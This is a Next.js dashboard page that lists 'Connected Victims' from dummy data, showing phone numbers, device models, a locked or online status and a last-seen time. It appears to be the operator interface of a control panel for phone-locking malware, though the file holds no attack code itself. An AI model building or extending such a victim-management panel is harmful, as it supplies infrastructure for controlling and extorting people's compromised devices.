"use client";
import { useState } from "react";
import { dummyVictims, Victim } from "@/lib/dummyData";
import Link from "next/link";

export default function DashboardPage() {
  const [victims] = useState<Victim[]>(dummyVictims);
  return (
    <div>
      <h2 className="text-2xl font-bold mb-6">📡 Connected Victims</h2>
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
        {victims.map((v) => (
          <Link key={v.id} href={`/dashboard/victims/${v.id}`}>
            <div className="bg-gray-900 border border-gray-800 rounded-lg p-5 hover:border-cyan-500 transition cursor-pointer">
              <div className="flex justify-between items-start">
                <div>
                  <h3 className="font-semibold text-lg">{v.phone}</h3>
                  <p className="text-gray-400 text-sm">{v.model}</p>
                </div>
                <span className={`text-xs px-2 py-1 rounded ${v.locked ? "bg-red-900 text-red-300" : "bg-green-900 text-green-300"}`}>
                  {v.locked ? "🔒 Locked" : "🟢 Online"}
                </span>
              </div>
              <p className="text-gray-500 text-xs mt-3">Last seen: {v.lastSeen}</p>
            </div>
          </Link>
        ))}
      </div>
    </div>
  );
}
